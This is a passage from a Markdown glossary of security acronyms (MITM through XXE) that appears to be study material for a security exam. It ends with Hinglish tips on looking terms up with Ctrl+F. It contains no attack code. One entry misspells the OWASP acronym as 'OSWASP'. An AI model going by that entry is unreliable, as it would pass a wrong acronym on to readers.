| **MITM** | Man In The Middle |
| **NAT** | Network Address Translation |
| **NetBIOS** | Network Basic Input/Output System |
| **NFS** | Network File System |
| **NIDS** | Network Intrusion Detection System |
| **NSE** | Nmap Scripting Engine |
| **NTDS** | NT Directory Services |
| **NTLM** | NT LAN Manager |
| **OSINT** | Open Source Intelligence |
| **OSWASP** | Open Web Application Security Project |
| **PCI-DSS** | Payment Card Industry Data Security Standard |
| **PE** | Portable Executable / Privilege Escalation |
| **PII** | Personally Identifiable Information |
| **PKI** | Public Key Infrastructure |
| **POC** | Proof of Concept |
| **PSK** | Pre-Shared Key |
| **PtH** | Pass-the-Hash |
| **PtT** | Pass-the-Ticket |
| **RAT** | Remote Access Trojan |
| **RCE** | Remote Code Execution |
| **RDP** | Remote Desktop Protocol |
| **RFI** | Remote File Inclusion |
| **RID** | Relative Identifier (Windows) |
| **RPC** | Remote Procedure Call |
| **SAM** | Security Accounts Manager |
| **SaaS** | Software as a Service |
| **SCADA** | Supervisory Control and Data Acquisition |
| **SID** | Security Identifier |
| **SIEM** | Security Information and Event Management |
| **SMB** | Server Message Block |
| **SMTP** | Simple Mail Transfer Protocol |
| **SNMP** | Simple Network Management Protocol |
| **SOC** | Security Operations Center |
| **SQLi** | SQL Injection |
| **SSDP** | Simple Service Discovery Protocol |
| **SSH** | Secure Shell |
| **SSID** | Service Set Identifier |
| **SSL** | Secure Sockets Layer |
| **SSO** | Single Sign-On |
| **SSRF** | Server-Side Request Forgery |
| **SSTI** | Server-Side Template Injection |
| **TGS** | Ticket Granting Service |
| **TGT** | Ticket Granting Ticket |
| **TLS** | Transport Layer Security |
| **TTP** | Tactics, Techniques, Procedures |
| **UAC** | User Account Control (Windows) |
| **UDP** | User Datagram Protocol |
| **VNC** | Virtual Network Computing |
| **VPN** | Virtual Private Network |
| **WAF** | Web Application Firewall |
| **WEP** | Wired Equivalent Privacy |
| **WinRM** | Windows Remote Management |
| **WPA** | WiFi Protected Access |
| **WPS** | WiFi Protected Setup |
| **XSS** | Cross-Site Scripting |
| **XXE** | XML External Entity |

---

## 💡 Tip: kaise use karo yeh glossary

1. **Prep ke time:** padhne ke baad question mein koi term aaye → seedhe Ctrl+F karo yahan
2. **Exam ke time:** repo open hi rahega — koi term confuse kare → 5 sec mein samajh aa jayega
3. **Doubt list banao:** prep ke pehle hafte mein, jo terms naye lagein, unko ek separate list mein note karo aur 1-1 karke padho

**Yaad rakho:** Tum sab kuch yaad nahi karoge. Tumhe sirf **"yeh term jaani-pehchani lagti hai, repo mein milti hai"** feeling chahiye. Phir Ctrl+F.
